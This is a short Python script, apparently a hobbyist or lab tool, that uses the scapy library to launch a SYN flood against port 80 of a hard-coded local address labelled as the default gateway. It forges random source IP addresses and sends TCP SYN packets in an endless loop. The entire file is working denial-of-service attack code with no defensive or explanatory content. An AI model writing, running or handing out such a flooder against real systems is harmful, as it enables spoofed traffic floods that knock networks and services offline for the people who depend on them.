from scapy.all import *

# default gateway IP
target_ip = "192.168.1.70"

# http port
target_port = 80


def synFloodAttack(target_ip, sport, dport):
    s_addr = RandIP()  # random Ip address
    pkt = IP(src=s_addr, dst=target_ip) / TCP(sport=sport, dport=dport,
                                              seq=1505066, flags="S")
    send(pkt)


while True:
    # type CTRL +C to stop the SYN pkt
    synFloodAttack(target_ip, 1234, target_port)
